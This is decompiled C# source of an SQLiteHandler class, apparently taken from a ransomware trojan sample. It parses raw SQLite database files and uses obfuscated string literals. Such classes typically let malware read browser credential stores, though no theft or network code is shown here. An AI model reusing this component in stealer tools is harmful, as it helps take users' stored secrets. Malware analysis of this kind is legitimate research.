// Decompiled with JetBrains decompiler
// Type: SQLiteHandler
// Assembly: 222222, Version=7.75.26.79, Culture=neutral, PublicKeyToken=null
// MVID: 4BBEBC6C-8846-4FD8-8CBA-F3F42BFE498C
// Assembly location: C:\Users\Administrateur\Downloads\Virusshare.00100-msil\Trojan-Ransom.Win32.Foreign.mxnf-86627272f15f9986eda96f2b9cf928cf060c453bafd8c484fce237fd3ff62a0a.exe

using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using System;
using System.IO;
using System.Text;

public class SQLiteHandler
{
  public static byte[] db_bytes;
  public static ushort page_size;
  public static ulong encoding;
  public static SQLiteHandler.sqlite_master_entry[] master_table_entries;
  public static byte[] SQLDataTypeSize = new byte[10]
  {
    (byte) 0,
    (byte) 1,
    (byte) 2,
    (byte) 3,
    (byte) 4,
    (byte) 6,
    (byte) 8,
    (byte) 8,
    (byte) 0,
    (byte) 0
  };
  public static SQLiteHandler.table_entry[] table_entries;
  public static string[] field_names;

  public static int GVL(int startIndex)
  {
    if (startIndex > SQLiteHandler.db_bytes.Length)
      return 0;
    int num1 = startIndex;
    int num2 = checked (startIndex + 8);
    int index = num1;
    while (index <= num2)
    {
      if (index > checked (SQLiteHandler.db_bytes.Length - 1))
        return 0;
      if (((int) SQLiteHandler.db_bytes[index] & 128) != 128)
        return index;
      checked { ++index; }
    }
    return checked (startIndex + 8);
  }

  public static long CVL(int startIndex, int endIndex)
  {
    checked { ++endIndex; }
    byte[] numArray = new byte[8];
    int num1 = checked (endIndex - startIndex);
    bool flag = false;
    if (num1 == 0 | num1 > 9)
      return 0;
    switch (num1)
    {
      case 1:
        numArray[0] = checked ((byte) ((int) SQLiteHandler.db_bytes[startIndex] & (int) sbyte.MaxValue));
        return BitConverter.ToInt64(numArray, 0);
      case 9:
        flag = true;
        break;
    }
    int num2 = 1;
    int num3 = 7;
    int index1 = 0;
    if (flag)
    {
      numArray[0] = SQLiteHandler.db_bytes[checked (endIndex - 1)];
      checked { --endIndex; }
      index1 = 1;
    }
    int num4 = checked (endIndex - 1);
    int num5 = startIndex;
    int index2 = num4;
    while (index2 >= num5)
    {
      if (checked (index2 - 1) >= startIndex)
      {
        numArray[index1] = checked ((byte) ((int) unchecked ((byte) ((uint) SQLiteHandler.db_bytes[index2] >> (checked (num2 - 1) & 7))) & (int) byte.MaxValue >> num2 | (int) unchecked ((byte) ((uint) SQLiteHandler.db_bytes[checked (index2 - 1)] << (num3 & 7)))));
        checked { ++num2; }
        checked { ++index1; }
        checked { --num3; }
      }
      else if (!flag)
        numArray[index1] = checked ((byte) ((int) unchecked ((byte) ((uint) SQLiteHandler.db_bytes[index2] >> (checked (num2 - 1) & 7))) & (int) byte.MaxValue >> num2));
      checked { index2 += -1; }
    }
    return BitConverter.ToInt64(numArray, 0);
  }

  public static bool IsOdd(long value) => (value & 1L) == 1L;

  public static ulong ConvertToInteger(int startIndex, int Size)
  {
    if (Size > 8 | Size == 0)
      return 0;
    ulong integer = 0;
    int num1 = checked (Size - 1);
    int num2 = 0;
    while (num2 <= num1)
    {
      integer = integer << 8 | (ulong) SQLiteHandler.db_bytes[checked (startIndex + num2)];
      checked { ++num2; }
    }
    return integer;
  }

  public void RDMSTRTBLE(ulong Offset)
  {
    if (SQLiteHandler.db_bytes[checked ((int) Offset)] == (byte) 13)
    {
      ushort uint16 = Convert.ToUInt16(Decimal.Subtract(new Decimal(SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
      int num1 = 0;
      if (SQLiteHandler.master_table_entries != null)
      {
        num1 = SQLiteHandler.master_table_entries.Length;
        SQLiteHandler.master_table_entries = (SQLiteHandler.sqlite_master_entry[]) Utils.CopyArray((Array) SQLiteHandler.master_table_entries, (Array) new SQLiteHandler.sqlite_master_entry[checked (SQLiteHandler.master_table_entries.Length + (int) uint16 + 1)]);
      }
      else
        SQLiteHandler.master_table_entries = new SQLiteHandler.sqlite_master_entry[checked ((int) uint16 + 1)];
      int num2 = (int) uint16;
      int num3 = 0;
      while (num3 <= num2)
      {
        ulong integer = SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 8M), new Decimal(checked (num3 * 2)))), 2);
        if (Decimal.Compare(new Decimal(Offset), 100M) != 0)
          checked { integer += Offset; }
        int endIndex1 = SQLiteHandler.GVL(checked ((int) integer));
        SQLiteHandler.CVL(checked ((int) integer), endIndex1);
        int endIndex2 = SQLiteHandler.GVL(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex1), new Decimal(integer))), 1M)));
        SQLiteHandler.master_table_entries[checked (num1 + num3)].row_id = SQLiteHandler.CVL(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex1), new Decimal(integer))), 1M)), endIndex2);
        ulong uint64 = Convert.ToUInt64(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex2), new Decimal(integer))), 1M));
        int endIndex3 = SQLiteHandler.GVL(checked ((int) uint64));
        int endIndex4 = endIndex3;
        long num4 = SQLiteHandler.CVL(checked ((int) uint64), endIndex3);
        long[] numArray = new long[5];
        int index = 0;
        do
        {
          int startIndex = checked (endIndex4 + 1);
          endIndex4 = SQLiteHandler.GVL(startIndex);
          numArray[index] = SQLiteHandler.CVL(startIndex, endIndex4);
          numArray[index] = numArray[index] <= 9L ? (long) SQLiteHandler.SQLDataTypeSize[checked ((int) numArray[index])] : (!SQLiteHandler.IsOdd(numArray[index]) ? checked ((long) Math.Round(unchecked ((double) checked (numArray[index] - 12L) / 2.0))) : checked ((long) Math.Round(unchecked ((double) checked (numArray[index] - 13L) / 2.0))));
          checked { ++index; }
        }
        while (index <= 4);
        if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 1M) == 0)
          SQLiteHandler.master_table_entries[checked (num1 + num3)].item_type = Encoding.Default.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(new Decimal(uint64), new Decimal(num4))), checked ((int) numArray[0]));
        else if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 2M) == 0)
          SQLiteHandler.master_table_entries[checked (num1 + num3)].item_type = Encoding.Unicode.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(new Decimal(uint64), new Decimal(num4))), checked ((int) numArray[0]));
        else if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 3M) == 0)
          SQLiteHandler.master_table_entries[checked (num1 + num3)].item_type = Encoding.BigEndianUnicode.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(new Decimal(uint64), new Decimal(num4))), checked ((int) numArray[0]));
        if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 1M) == 0)
          SQLiteHandler.master_table_entries[checked (num1 + num3)].item_name = Encoding.Default.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0]))), checked ((int) numArray[1]));
        else if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 2M) == 0)
          SQLiteHandler.master_table_entries[checked (num1 + num3)].item_name = Encoding.Unicode.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0]))), checked ((int) numArray[1]));
        else if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 3M) == 0)
          SQLiteHandler.master_table_entries[checked (num1 + num3)].item_name = Encoding.BigEndianUnicode.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0]))), checked ((int) numArray[1]));
        SQLiteHandler.master_table_entries[checked (num1 + num3)].root_num = checked ((long) SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2]))), (int) numArray[3]));
        if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 1M) == 0)
          SQLiteHandler.master_table_entries[checked (num1 + num3)].sql_statement = Encoding.Default.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
        else if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 2M) == 0)
          SQLiteHandler.master_table_entries[checked (num1 + num3)].sql_statement = Encoding.Unicode.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
        else if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 3M) == 0)
          SQLiteHandler.master_table_entries[checked (num1 + num3)].sql_statement = Encoding.BigEndianUnicode.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(numArray[0])), new Decimal(numArray[1])), new Decimal(numArray[2])), new Decimal(numArray[3]))), checked ((int) numArray[4]));
        checked { ++num3; }
      }
    }
    else
    {
      if (SQLiteHandler.db_bytes[checked ((int) Offset)] != (byte) 5)
        return;
      int uint16 = (int) Convert.ToUInt16(Decimal.Subtract(new Decimal(SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
      int num = 0;
      while (num <= uint16)
      {
        ushort integer = checked ((ushort) SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 12M), new Decimal(num * 2))), 2));
        if (Decimal.Compare(new Decimal(Offset), 100M) == 0)
          this.RDMSTRTBLE(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(SQLiteHandler.ConvertToInteger((int) integer, 4)), 1M), new Decimal((int) SQLiteHandler.page_size))));
        else
          this.RDMSTRTBLE(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(SQLiteHandler.ConvertToInteger(checked ((int) (Offset + (ulong) integer)), 4)), 1M), new Decimal((int) SQLiteHandler.page_size))));
        checked { ++num; }
      }
      this.RDMSTRTBLE(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 8M)), 4)), 1M), new Decimal((int) SQLiteHandler.page_size))));
    }
  }

  public static bool REDTBLEFromOffset(ulong Offset)
  {
    if (SQLiteHandler.db_bytes[checked ((int) Offset)] == (byte) 13)
    {
      ushort uint16 = Convert.ToUInt16(Decimal.Subtract(new Decimal(SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
      int num1 = 0;
      if (SQLiteHandler.table_entries != null)
      {
        num1 = SQLiteHandler.table_entries.Length;
        SQLiteHandler.table_entries = (SQLiteHandler.table_entry[]) Utils.CopyArray((Array) SQLiteHandler.table_entries, (Array) new SQLiteHandler.table_entry[checked (SQLiteHandler.table_entries.Length + (int) uint16 + 1)]);
      }
      else
        SQLiteHandler.table_entries = new SQLiteHandler.table_entry[checked ((int) uint16 + 1)];
      int num2 = (int) uint16;
      int num3 = 0;
      while (num3 <= num2)
      {
        ulong integer = SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 8M), new Decimal(checked (num3 * 2)))), 2);
        if (Decimal.Compare(new Decimal(Offset), 100M) != 0)
          checked { integer += Offset; }
        int endIndex1 = SQLiteHandler.GVL(checked ((int) integer));
        SQLiteHandler.CVL(checked ((int) integer), endIndex1);
        int endIndex2 = SQLiteHandler.GVL(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex1), new Decimal(integer))), 1M)));
        SQLiteHandler.table_entries[checked (num1 + num3)].row_id = SQLiteHandler.CVL(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex1), new Decimal(integer))), 1M)), endIndex2);
        ulong uint64 = Convert.ToUInt64(Decimal.Add(Decimal.Add(new Decimal(integer), Decimal.Subtract(new Decimal(endIndex2), new Decimal(integer))), 1M));
        int endIndex3 = SQLiteHandler.GVL(checked ((int) uint64));
        int endIndex4 = endIndex3;
        long num4 = SQLiteHandler.CVL(checked ((int) uint64), endIndex3);
        long num5 = Convert.ToInt64(Decimal.Add(Decimal.Subtract(new Decimal(uint64), new Decimal(endIndex3)), 1M));
        int index1 = 0;
        SQLiteHandler.record_header_field[] arySrc;
        while (num5 < num4)
        {
          arySrc = (SQLiteHandler.record_header_field[]) Utils.CopyArray((Array) arySrc, (Array) new SQLiteHandler.record_header_field[checked (index1 + 1)]);
          int startIndex = checked (endIndex4 + 1);
          endIndex4 = SQLiteHandler.GVL(startIndex);
          arySrc[index1].type = SQLiteHandler.CVL(startIndex, endIndex4);
          arySrc[index1].size = arySrc[index1].type <= 9L ? (long) SQLiteHandler.SQLDataTypeSize[checked ((int) arySrc[index1].type)] : (!SQLiteHandler.IsOdd(arySrc[index1].type) ? checked ((long) Math.Round(unchecked ((double) checked (arySrc[index1].type - 12L) / 2.0))) : checked ((long) Math.Round(unchecked ((double) checked (arySrc[index1].type - 13L) / 2.0))));
          num5 = checked (num5 + (long) (endIndex4 - startIndex) + 1L);
          checked { ++index1; }
        }
        SQLiteHandler.table_entries[checked (num1 + num3)].content = new string[checked (arySrc.Length - 1 + 1)];
        int num6 = 0;
        int num7 = checked (arySrc.Length - 1);
        int index2 = 0;
        while (index2 <= num7)
        {
          if (arySrc[index2].type > 9L)
          {
            if (!SQLiteHandler.IsOdd(arySrc[index2].type))
            {
              if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 1M) == 0)
                SQLiteHandler.table_entries[checked (num1 + num3)].content[index2] = Encoding.Default.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(num6))), checked ((int) arySrc[index2].size));
              else if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 2M) == 0)
                SQLiteHandler.table_entries[checked (num1 + num3)].content[index2] = Encoding.Unicode.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(num6))), checked ((int) arySrc[index2].size));
              else if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 3M) == 0)
                SQLiteHandler.table_entries[checked (num1 + num3)].content[index2] = Encoding.BigEndianUnicode.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(num6))), checked ((int) arySrc[index2].size));
            }
            else
              SQLiteHandler.table_entries[checked (num1 + num3)].content[index2] = Encoding.Default.GetString(SQLiteHandler.db_bytes, Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(num6))), checked ((int) arySrc[index2].size));
          }
          else
            SQLiteHandler.table_entries[checked (num1 + num3)].content[index2] = Conversions.ToString(SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(uint64), new Decimal(num4)), new Decimal(num6))), checked ((int) arySrc[index2].size)));
          num6 = checked ((int) ((long) num6 + arySrc[index2].size));
          checked { ++index2; }
        }
        checked { ++num3; }
      }
    }
    else if (SQLiteHandler.db_bytes[checked ((int) Offset)] == (byte) 5)
    {
      int uint16 = (int) Convert.ToUInt16(Decimal.Subtract(new Decimal(SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 3M)), 2)), 1M));
      int num = 0;
      while (num <= uint16)
      {
        ushort integer = checked ((ushort) SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(Decimal.Add(new Decimal(Offset), 12M), new Decimal(num * 2))), 2));
        SQLiteHandler.REDTBLEFromOffset(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(SQLiteHandler.ConvertToInteger(checked ((int) (Offset + (ulong) integer)), 4)), 1M), new Decimal((int) SQLiteHandler.page_size))));
        checked { ++num; }
      }
      SQLiteHandler.REDTBLEFromOffset(Convert.ToUInt64(Decimal.Multiply(Decimal.Subtract(new Decimal(SQLiteHandler.ConvertToInteger(Convert.ToInt32(Decimal.Add(new Decimal(Offset), 8M)), 4)), 1M), new Decimal((int) SQLiteHandler.page_size))));
    }
    return true;
  }

  public static bool REDTBLE(string TableName)
  {
    int index1 = -1;
    int length = SQLiteHandler.master_table_entries.Length;
    int index2 = 0;
    while (index2 <= length)
    {
      if (SQLiteHandler.master_table_entries[index2].item_name.ToLower().CompareTo(TableName.ToLower()) == 0)
      {
        index1 = index2;
        break;
      }
      checked { ++index2; }
    }
    if (index1 == -1)
      return false;
    string[] strArray = SQLiteHandler.master_table_entries[index1].sql_statement.Substring(checked (SQLiteHandler.master_table_entries[index1].sql_statement.IndexOf("(") + 1)).Split(',');
    int num = checked (strArray.Length - 1);
    int index3 = 0;
    while (index3 <= num)
    {
      strArray[index3] = Strings.LTrim(strArray[index3]);
      object Left = (object) strArray[index3].IndexOf(" ");
      if (Operators.ConditionalCompareObjectGreater(Left, (object) 0, false))
        strArray[index3] = strArray[index3].Substring(0, Conversions.ToInteger(Left));
      if (strArray[index3].IndexOf(UYGQQYLC.WEGPJNXO("jaGntqx9Dw==", "False")) != 0)
      {
        SQLiteHandler.field_names = (string[]) Utils.CopyArray((Array) SQLiteHandler.field_names, (Array) new string[checked (index3 + 1)]);
        SQLiteHandler.field_names[index3] = strArray[index3];
        checked { ++index3; }
      }
      else
        break;
    }
    return SQLiteHandler.REDTBLEFromOffset(checked ((ulong) ((SQLiteHandler.master_table_entries[index1].root_num - 1L) * (long) SQLiteHandler.page_size)));
  }

  public static int GetRowCount() => SQLiteHandler.table_entries.Length;

  public static string GetValue(int row_num, int field)
  {
    if (row_num >= SQLiteHandler.table_entries.Length)
      return (string) null;
    return field >= SQLiteHandler.table_entries[row_num].content.Length ? (string) null : SQLiteHandler.table_entries[row_num].content[field];
  }

  public static string GetValue(int row_num, string field)
  {
    int field1 = -1;
    int length = SQLiteHandler.field_names.Length;
    int index = 0;
    while (index <= length)
    {
      if (SQLiteHandler.field_names[index].ToLower().CompareTo(field.ToLower()) == 0)
      {
        field1 = index;
        break;
      }
      checked { ++index; }
    }
    return field1 == -1 ? (string) null : SQLiteHandler.GetValue(row_num, field1);
  }

  public static string[] GetTableNames()
  {
    int index1 = 0;
    int num = checked (SQLiteHandler.master_table_entries.Length - 1);
    int index2 = 0;
    string[] arySrc;
    while (index2 <= num)
    {
      if (Operators.CompareString(SQLiteHandler.master_table_entries[index2].item_type, UYGQQYLC.WEGPJNXO("i5OfsJsv", "False"), false) == 0)
      {
        arySrc = (string[]) Utils.CopyArray((Array) arySrc, (Array) new string[checked (index1 + 1)]);
        arySrc[index1] = SQLiteHandler.master_table_entries[index2].item_name;
        checked { ++index1; }
      }
      checked { ++index2; }
    }
    return arySrc;
  }

  public SQLiteHandler(string baseName)
  {
    if (!File.Exists(baseName))
      return;
    FileSystem.FileOpen(1, baseName, OpenMode.Binary, OpenAccess.Read, OpenShare.Shared);
    string s = Strings.Space(checked ((int) FileSystem.LOF(1)));
    FileSystem.FileGet(1, ref s);
    FileSystem.FileClose(1);
    SQLiteHandler.db_bytes = Encoding.Default.GetBytes(s);
    if (Encoding.Default.GetString(SQLiteHandler.db_bytes, 0, 15).CompareTo(UYGQQYLC.WEGPJNXO("k6yy1tOle8zc0a282o2SBg==", "False")) != 0)
      throw new Exception(UYGQQYLC.WEGPJNXO("ks7ekcRk1cvdzKh/vcKvrdPPkZZko8vlxKbA3daDisjW1gY=", "False"));
    if (SQLiteHandler.db_bytes[52] != (byte) 0)
      throw new Exception(UYGQQYLC.WEGPJNXO("bbzGyHiiqLXOwJlntbq7jam+vmuQqMa6rY26t3m0n2fAyL9MusfJu5u5xr6vGg==", "False"));
    if (Decimal.Compare(new Decimal(SQLiteHandler.ConvertToInteger(44, 4)), 4M) >= 0)
      throw new Exception(UYGQQYLC.WEGPJNXO("dLBsxrqWsbvFuYulbKaojqa5tGWSosW4t0antb+qU6e7xbKHtSI=", "False"));
    SQLiteHandler.page_size = checked ((ushort) SQLiteHandler.ConvertToInteger(16, 2));
    SQLiteHandler.encoding = SQLiteHandler.ConvertToInteger(56, 4);
    if (Decimal.Compare(new Decimal(SQLiteHandler.encoding), 0M) == 0)
      SQLiteHandler.encoding = 1UL;
    this.RDMSTRTBLE(100UL);
  }

  public struct record_header_field
  {
    public long size;
    public long type;
  }

  public struct table_entry
  {
    public long row_id;
    public string[] content;
  }

  public struct sqlite_master_entry
  {
    public long row_id;
    public string item_type;
    public string item_name;
    public string astable_name;
    public long root_num;
    public string sql_statement;
  }
}
